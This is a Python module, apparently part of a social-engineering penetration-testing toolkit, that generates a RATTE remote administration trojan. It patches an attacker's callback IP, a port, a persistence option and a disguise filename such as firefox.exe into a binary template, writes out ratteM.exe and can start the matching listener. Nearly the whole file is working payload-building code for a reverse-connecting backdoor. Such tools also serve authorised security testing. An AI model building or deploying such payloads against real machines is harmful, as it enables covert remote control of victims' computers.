#!/usr/bin/env python
#
# These are required fields
#
import os
import subprocess
from time import sleep

import src.core.setcore as core
from src.core.menu import text

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

# "This is RATTE (Remote Administration Tool Tommy Edition) prepare module.It will prepare a custom ratteM.exe."
MAIN="RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first"
AUTHOR="Thomas Werth"


#
# Start ratteserver
#
def ratte_listener_start(port):
    subprocess.Popen("src/payloads/ratte/ratteserver %d" % port, shell=True).wait()


def prepare_ratte(ipaddr, ratteport, persistent, customexe):
    core.print_info("preparing RATTE...")
    # replace ipaddress with one that we need for reverse connection back
    ############
    # Load content of RATTE
    ############
    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
        data = fileopen.read()

    ############
    # PATCH Server IP into RATTE
    ############
    with open(os.path.join(core.userconfigpath, "ratteM.exe"), "wb") as filewrite:

        host = (len(ipaddr) + 1) * "X"
        r_port = (len(str(ratteport)) + 1) * "Y"
        pers = (len(str(persistent)) + 1) * "Z"
        # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
        if customexe:
            cexe = (len(str(customexe)) + 1) * "Q"
        else:
            cexe = ""

        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))

        # filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
        # filewrite.write(data.replace(str(pers), persistent+"\x00", 1).replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )


# def main(): header is required
def main():
    valid_site = False
    valid_ip = False
    valid_response = False
    input_counter = 0

    #################
    # get User Input
    #################
    # ipaddr=input(setprompt(["9", "2"], "IP address to connect back on"))
    while valid_ip != True and input_counter < 3:
        ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
        valid_ip = core.validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                input_counter += 1

    # try:
    #         ratteport=int(input(setprompt(["9", "2"], "Port RATTE Server should listen on")))
    #         while ratteport==0 or ratteport > 65535:
    #                 print_warning('Port must not be equal to javaport!')
    #                 ratteport=int(input(setprompt(["9", "2"], "Enter port RATTE Server should listen on")))
    # except ValueError:
    #         ratteport=8080

    try:
        ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
        while ratteport == 0 or ratteport > 65535:
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(input(core.setprompt(["9", "2"], "Enter port RATTE Server should listen on [8080]")))
    except ValueError:
        # core.print_info("Port set to default of 8080")
        ratteport = 8080

    # persistent=input(setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
    # if persistent == 'no' or persistent == '' or persistent == 'n':
    #         persistent='NO'
    # else:
    #         persistent='YES'

    while not valid_response:
        persistent = input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
        persistent = str.lower(persistent)
        if persistent == "no" or persistent == "n":
            persistent = "NO"
            valid_response = True
        elif persistent == "yes" or persistent == "y":
            persistent = "YES"
            valid_response = True
        else:
            core.print_warning(text.YES_NO_RESPONSES)

    valid_response = False

    customexe = input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))

    ############
    # prepare RATTE
    ############
    prepare_ratte(ipaddr, ratteport, persistent, customexe)

    core.print_status("Payload has been exported to %s" % os.path.join(core.userconfigpath, "ratteM.exe"))

    ###################
    # start ratteserver
    ###################
    # prompt=input(setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
    # if prompt == "yes" or prompt == "" or prompt == "y":
    #         print_info("Starting ratteserver...")
    #         ratte_listener_start(ratteport)

    while not valid_response:
        prompt = input(core.setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
        prompt = str.lower(prompt)
        if prompt == "no" or prompt == "n":
            # prompt = "NO"
            core.print_error("Aborting...")
            sleep(2)
            valid_response = True
        elif prompt == "yes" or prompt == "y":
            core.print_info("Starting ratteserver...")
            ratte_listener_start(ratteport)
            core.print_info("Stopping ratteserver...")
            sleep(2)
            valid_response = True
        else:
            core.print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
